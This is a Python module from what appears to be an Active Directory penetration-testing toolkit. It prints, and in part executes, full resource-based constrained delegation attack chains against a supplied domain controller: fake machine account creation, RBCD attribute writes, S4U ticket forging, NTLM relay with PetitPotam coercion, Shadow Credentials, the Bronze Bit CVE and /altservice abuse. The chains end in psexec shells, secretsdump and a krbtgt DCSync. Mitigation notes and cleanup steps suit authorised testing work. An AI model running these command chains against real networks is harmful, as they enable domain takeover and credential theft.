"""
Module: RBCD Full Chain
Techniques: MAQ + addcomputer + set RBCD + S4U2Self/S4U2Proxy + psexec,
            RBCD via NTLM relay, Bronze Bit (CVE-2020-17049),
            RBCD via Shadow Credentials combo, cleanup
"""
from utils.helpers import *
from config.settings import SESSION

def run():
    print_banner("RBCD FULL CHAIN", "Resource-Based Constrained Delegation attacks")
    dc   = input_or_session("dc_ip",    "DC IP")
    dom  = input_or_session("domain",   "Domain")
    user = input_or_session("username", "Username")
    pw   = input_or_session("password", "Password")

    print(f"""
  [1]  RBCD Full Chain (MAQ → psexec)
  [2]  RBCD via NTLM Relay (ntlmrelayx --delegate-access)
  [3]  RBCD via Shadow Credentials combo
  [4]  Bronze Bit (CVE-2020-17049)
  [5]  S4U2Self Abuse (service account impersonation)
  [6]  RBCD Check / Enumerate delegations
  [7]  Cleanup (remove RBCD)
  [8]  Powermad — Machine Account Creation (Windows-side)
  [9]  Constrained Delegation Alternate Service (/altservice)
  [0]  Back
""")
    c = input(f"  {M}Choice:{RST} ").strip()

    if c == "1":
        target   = prompt("Target computer (want to pwn, e.g. DC01)")
        comp_name= prompt("Fake computer name (default=RBCDCOMP)") or "RBCDCOMP"
        comp_pass= prompt("Fake computer password (default=P@ss1234!)") or "P@ss1234!"
        impuser  = prompt("User to impersonate (default=Administrator)") or "Administrator"

        print(f"""
  {C}RBCD Full Chain — Step by Step:{RST}

  {Y}Step 1 — Check MachineAccountQuota (default=10):{RST}
  nxc ldap {dc} -u '{user}' -p '{pw}' -d {dom} -M maq
  # or:
  ldapsearch -x -H ldap://{dc} -D '{user}@{dom}' -w '{pw}' \\
    -b 'DC={dom.replace(".", ",DC=")}' '(objectClass=domain)' \\
    ms-ds-machineaccountquota

  {Y}Step 2 — Add fake computer account:{RST}
  impacket-addcomputer \\
    {dom}/{user}:'{pw}' \\
    -computer-name '{comp_name}$' \\
    -computer-pass '{comp_pass}' \\
    -dc-ip {dc}

  {Y}Step 3 — Set RBCD on target computer:{RST}
  impacket-rbcd \\
    -f '{comp_name}' \\
    -t '{target}' \\
    {dom}/{user}:'{pw}' \\
    -dc-ip {dc} \\
    -action write

  {Y}Step 4 — Get Service Ticket (S4U2Proxy):{RST}
  impacket-getST \\
    -spn 'cifs/{target}.{dom}' \\
    -impersonate {impuser} \\
    {dom}/{comp_name}$:'{comp_pass}' \\
    -dc-ip {dc}

  {Y}Step 5 — Use ticket:{RST}
  export KRB5CCNAME={impuser}@cifs_{target}.{dom}@{dom.upper()}.ccache
  impacket-psexec {dom}/{impuser}@{target}.{dom} -k -no-pass
  impacket-secretsdump {dom}/{impuser}@{target}.{dom} -k -no-pass -just-dc-ntlm
""")
        run_cmd(
            f"{imp('addcomputer.py')} {dom}/{user}:'{pw}' "
            f"-computer-name '{comp_name}$' -computer-pass '{comp_pass}' -dc-ip {dc}"
        )
        add_finding("RBCD Full Chain", "Critical",
                    f"Fake computer '{comp_name}$' created; RBCD set on '{target}'; {impuser} impersonated",
                    "Set ms-ds-MachineAccountQuota=0; monitor msDS-AllowedToActOnBehalfOfOtherIdentity changes")

    elif c == "2":
        attacker = input_or_session("attacker_ip", "Attacker IP")
        target   = prompt("Target computer to set RBCD on")
        impuser  = prompt("User to impersonate (default=Administrator)") or "Administrator"
        print(f"""
  {C}RBCD via NTLM Relay:{RST}

  {Y}Terminal 1 — ntlmrelayx with --delegate-access:{RST}
  impacket-ntlmrelayx \\
    -t ldap://{dc} \\
    -smb2support \\
    --delegate-access \\
    --no-smb-server

  {Y}Terminal 2 — Trigger coercion from target computer:{RST}
  python3 printerbug.py '{dom}/{user}:{pw}@{target}.{dom}' {attacker}
  # or
  python3 tools/PetitPotam/PetitPotam.py {attacker} {target}.{dom}

  {Y}ntlmrelayx output:{RST}
  [+] RBCD attack: computer account NTLMRELAY$ created
  [+] Delegation rights set successfully!

  {Y}Step 3 — Get ST using auto-created computer:{RST}
  impacket-getST \\
    -spn 'cifs/{target}.{dom}' \\
    -impersonate {impuser} \\
    {dom}/NTLMRELAY$:'RANDOMPASSWORD' \\
    -dc-ip {dc}

  export KRB5CCNAME={impuser}@cifs_{target}.{dom}@{dom.upper()}.ccache
  impacket-psexec {dom}/{impuser}@{target}.{dom} -k -no-pass
""")
        add_finding("RBCD via NTLM Relay", "Critical",
                    f"RBCD rights delegated to relay-created computer via coercion from {target}",
                    "Enforce SMB signing; patch coercion vectors; monitor RBCD attribute changes")

    elif c == "3":
        target  = prompt("Target computer (with GenericWrite accessible)")
        impuser = prompt("User to impersonate (default=Administrator)") or "Administrator"
        print(f"""
  {C}RBCD via Shadow Credentials — no need for MAQ!{RST}

  {Y}Step 1 — Add shadow credentials to target computer (pyWhisker):{RST}
  python3 pywhisker.py \\
    -d {dom} -u '{user}' -p '{pw}' \\
    --target '{target}$' \\
    --action add --filename /tmp/{target}_sc \\
    --dc-ip {dc}

  {Y}Step 2 — PKINIT → NT hash of computer account:{RST}
  certipy auth \\
    -pfx /tmp/{target}_sc.pfx \\
    -username '{target}$' \\
    -domain {dom} -dc-ip {dc}
  # Output: NT hash of {target}$

  {Y}Step 3 — S4U2Self with computer hash (no MAQ needed):{RST}
  impacket-getST \\
    -spn 'cifs/{target}.{dom}' \\
    -impersonate {impuser} \\
    -hashes :<computer_nt_hash> \\
    {dom}/{target}$ \\
    -dc-ip {dc}

  export KRB5CCNAME={impuser}@cifs_{target}.{dom}@{dom.upper()}.ccache
  impacket-psexec {dom}/{impuser}@{target}.{dom} -k -no-pass
""")

    elif c == "4":
        print(f"""
  {C}Bronze Bit — CVE-2020-17049 (S4U2Proxy with non-forwardable ticket):{RST}

  {Y}Concept:{RST}
  Unpatched DCs allow S4U2Proxy with non-forwardable TGS.
  This bypasses the requirement for the user to have
  "Account is sensitive and cannot be delegated" cleared.

  {Y}Requirements:{RST}
  - Service account with constrained delegation configured
  - Service account credentials (password or hash)
  - Unpatched DC (pre KB4598347 — Nov 2020)

  {Y}impacket-getST with -force-forwardable:{RST}
  impacket-getST \\
    -spn 'cifs/<target>.{dom}' \\
    -impersonate Administrator \\
    -force-forwardable \\
    -hashes :<svc_nt_hash> \\
    {dom}/<svc_account> \\
    -dc-ip {dc}

  {Y}Check if domain patched:{RST}
  # Check DC OS version and patch level:
  nxc smb {dc} -u '{user}' -p '{pw}' -d {dom}
  # Look for KB4598347 in Windows Update history
""")
        add_finding("Bronze Bit (CVE-2020-17049)", "High",
                    "S4U2Proxy forwardable ticket bypass tested — check if DC is patched",
                    "Apply KB4598347; ensure all DCs are fully patched")

    elif c == "5":
        svc_user = prompt("Service account with S4U2Self (unconstrained or constrained)")
        svc_pass = prompt("Service account password")
        impuser  = prompt("User to impersonate")
        spn      = prompt("SPN (e.g. cifs/dc01.corp.local)")
        print(f"""
  {C}S4U2Self — impersonate any user via service account:{RST}

  {Y}Requirements:{RST}
  - Service account with TrustedToAuthForDelegation set, OR
  - Service account with constrained delegation + AnyProtocol

  {Y}impacket-getST with -self:{RST}
  impacket-getST \\
    -spn '{spn}' \\
    -impersonate {impuser} \\
    -self \\
    {dom}/{svc_user}:'{svc_pass}' \\
    -dc-ip {dc}

  {Y}Use ticket:{RST}
  export KRB5CCNAME={impuser}@{spn.replace("/","_")}@{dom.upper()}.ccache
  impacket-psexec {dom}/{impuser}@{dc} -k -no-pass
""")

    elif c == "6":
        print(f"""
  {C}Enumerate RBCD and delegations:{RST}

  {Y}impacket-findDelegation:{RST}
  impacket-findDelegation {dom}/{user}:'{pw}' -dc-ip {dc}

  {Y}nxc LDAP trusted-for-delegation:{RST}
  nxc ldap {dc} -u '{user}' -p '{pw}' -d {dom} --trusted-for-delegation

  {Y}ldapsearch — find RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity):{RST}
  ldapsearch -x -H ldap://{dc} -D '{user}@{dom}' -w '{pw}' \\
    -b 'DC={dom.replace(".", ",DC=")}' \\
    '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)' \\
    sAMAccountName msDS-AllowedToActOnBehalfOfOtherIdentity

  {Y}PowerView (Windows):{RST}
  Get-DomainComputer | \\
    Where-Object {{$_."msds-allowedtoactonbehalfofotheridentity"}} | \\
    Select-Object sAMAccountName,msds-allowedtoactonbehalfofotheridentity
""")
        run_cmd(f"{imp('findDelegation.py')} {dom}/{user}:'{pw}' -dc-ip {dc}")

    elif c == "7":
        target    = prompt("Target computer to clean up RBCD from")
        comp_name = prompt("Fake computer name to delete (e.g. RBCDCOMP)")
        print(f"""
  {C}RBCD Cleanup:{RST}

  {Y}Step 1 — Remove RBCD attribute from target:{RST}
  impacket-rbcd \\
    -f '{comp_name}' \\
    -t '{target}' \\
    {dom}/{user}:'{pw}' \\
    -dc-ip {dc} \\
    -action remove

  {Y}Step 2 — Delete fake computer account:{RST}
  impacket-addcomputer \\
    {dom}/{user}:'{pw}' \\
    -computer-name '{comp_name}$' \\
    -computer-pass '' \\
    -dc-ip {dc} \\
    -delete

  {Y}Verify cleanup:{RST}
  ldapsearch -x -H ldap://{dc} -D '{user}@{dom}' -w '{pw}' \\
    -b 'DC={dom.replace(".", ",DC=")}' \\
    '(sAMAccountName={comp_name}$)' sAMAccountName
""")
        run_cmd(
            f"{imp('rbcd.py')} -f '{comp_name}' -t '{target}' "
            f"{dom}/{user}:'{pw}' -dc-ip {dc} -action remove"
        )

    elif c == "8":
        comp_name = prompt("Fake machine account name (e.g. us-mgmt)") or "us-mgmt"
        comp_pass = prompt("Machine account password") or "P@ssword@123"
        target    = prompt("Target computer to set RBCD on")
        impuser   = prompt("User to impersonate (default=Administrator)") or "Administrator"
        print(f"""
  {NEON_CYN}Powermad — Machine Account Creation (Windows-side RBCD):{RST}

  {DIM}Powermad creates machine accounts directly from Windows without needing
  impacket-addcomputer. Useful when running fully from a Windows foothold.{RST}

  ── Step 1: Import Powermad & create machine account ──────────────────────
  . C:\\AD\\Tools\\Powermad\\Powermad.ps1

  New-MachineAccount \\
    -MachineAccount {comp_name} \\
    -Password (ConvertTo-SecureString '{comp_pass}' -AsPlainText -Force) \\
    -Verbose

  # Verify created:
  Get-ADComputer -Identity {comp_name}

  ── Step 2: Get NT hash of new machine account (for Rubeus) ───────────────
  Rubeus.exe hash /password:'{comp_pass}' /user:{comp_name}$ /domain:{dom}
  # Note the RC4 (NTLM) and AES256 hashes

  ── Step 3: Set RBCD on target ────────────────────────────────────────────
  # Get SID of new machine account:
  $sid = Get-DomainComputer -Identity {comp_name} -Properties objectsid |
    Select -Expand objectsid

  # Build security descriptor:
  $SD = New-Object Security.AccessControl.RawSecurityDescriptor \\
    -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
  $SDbytes = New-Object byte[] ($SD.BinaryLength)
  $SD.GetBinaryForm($SDbytes, 0)

  # Write to target computer:
  Get-DomainComputer -Identity {target} | \\
    Set-DomainObject -Set @{{'msds-allowedtoactonbehalfofotheridentity'=$SDbytes}} -Verbose

  ── Step 4: S4U2Proxy via Rubeus ──────────────────────────────────────────
  Rubeus.exe s4u \\
    /user:{comp_name}$ \\
    /rc4:<nt_hash_from_step2> \\
    /impersonateuser:{impuser} \\
    /msdsspn:cifs/{target}.{dom} \\
    /ptt

  ── Step 5: Use ticket ────────────────────────────────────────────────────
  ls \\\\{target}.{dom}\\c$
  Enter-PSSession -ComputerName {target}.{dom}

  ── Step 6: Cleanup ───────────────────────────────────────────────────────
  # Remove RBCD attribute:
  Set-DomainObject -Identity {target} \\
    -Clear 'msds-allowedtoactonbehalfofotheridentity' -Verbose

  # Delete machine account (if you created it):
  Remove-ADComputer -Identity {comp_name} -Confirm:$false

  {DIM}Powermad: github.com/Kevin-Robertson/Powermad
  Works when MachineAccountQuota > 0 (default = 10){RST}
""")
        add_finding("Powermad RBCD Attack", "Critical",
                    f"Machine account '{comp_name}$' created via Powermad; RBCD set on '{target}' → {impuser} impersonated",
                    "Set ms-ds-MachineAccountQuota=0; monitor new computer account creation (Event 4741); audit msDS-AllowedToActOnBehalfOfOtherIdentity")

    elif c == "9":
        svc_user = prompt("Service account with constrained delegation")
        svc_hash = prompt("NT hash of service account")
        target_host = prompt("Delegation target host (e.g. DC01)")
        alt_svc  = prompt("Alternate service (e.g. ldap, host, http)") or "ldap"
        orig_spn = prompt("Original allowed SPN (e.g. cifs/DC01)")
        print(f"""
  {NEON_CYN}Constrained Delegation — Alternate Service Abuse (/altservice):{RST}

  {DIM}When a service account has constrained delegation configured for a specific
  SPN (e.g. cifs/DC01), Kerberos allows the TGS to be reused for ANY service
  on the same host by specifying /altservice. This means CIFS → LDAP, HOST, etc.{RST}

  ── Enumerate constrained delegation accounts ─────────────────────────────
  Get-DomainUser -TrustedToAuth | select userprincipalname,'msds-allowedtodelegateto'
  Get-DomainComputer -TrustedToAuth | select name,'msds-allowedtodelegateto'

  impacket-findDelegation {dom}/{user}:'{pw}' -dc-ip {dc}

  ── Step 1: S4U2Proxy with original SPN (get ST for cifs) ────────────────
  impacket-getST \\
    -spn '{orig_spn}' \\
    -impersonate Administrator \\
    -hashes :{svc_hash} \\
    {dom}/{svc_user} \\
    -dc-ip {dc}

  ── Step 2: Rubeus with /altservice ───────────────────────────────────────
  Rubeus.exe s4u \\
    /user:{svc_user} \\
    /rc4:{svc_hash} \\
    /impersonateuser:Administrator \\
    /msdsspn:{orig_spn} \\
    /altservice:{alt_svc} \\
    /domain:{dom} /dc:{dc} /ptt

  # Now have a ticket for {alt_svc}/{target_host}.{dom} as Administrator

  ── Step 3: Use alternate service ticket ──────────────────────────────────
  # LDAP → DCSync:
  Invoke-Mimi -Command '"lsadump::dcsync /user:{dom}\\krbtgt"'

  # HOST → PSExec / WMI:
  Enter-PSSession -ComputerName {target_host}.{dom}
  Invoke-Command -ComputerName {target_host}.{dom} -ScriptBlock {{whoami}}

  # HTTP → winrm / Evil-WinRM:
  evil-winrm -i {target_host}.{dom} -u Administrator

  {NEON_CYN}Impacket altservice equivalent: ───────────────────────────────{RST}
  # Use -additional-ticket flag to modify the TGS service:
  impacket-getST -spn '{alt_svc}/{target_host}.{dom}' \\
    -impersonate Administrator -hashes :{svc_hash} \\
    {dom}/{svc_user} -dc-ip {dc}

  {DIM}Key insight: The KDC only checks that the original SPN is in msDS-AllowedToDelegateTo.
  The altservice modification happens client-side — any service on the same host works.{RST}
""")
        add_finding("Constrained Delegation Alternate Service", "Critical",
                    f"{svc_user} delegation abused with /altservice:{alt_svc} → Administrator impersonated on {target_host}",
                    "Minimize constrained delegation configurations; use Protected Users group for sensitive accounts; monitor S4U2Proxy requests for unexpected service names")

    pause()
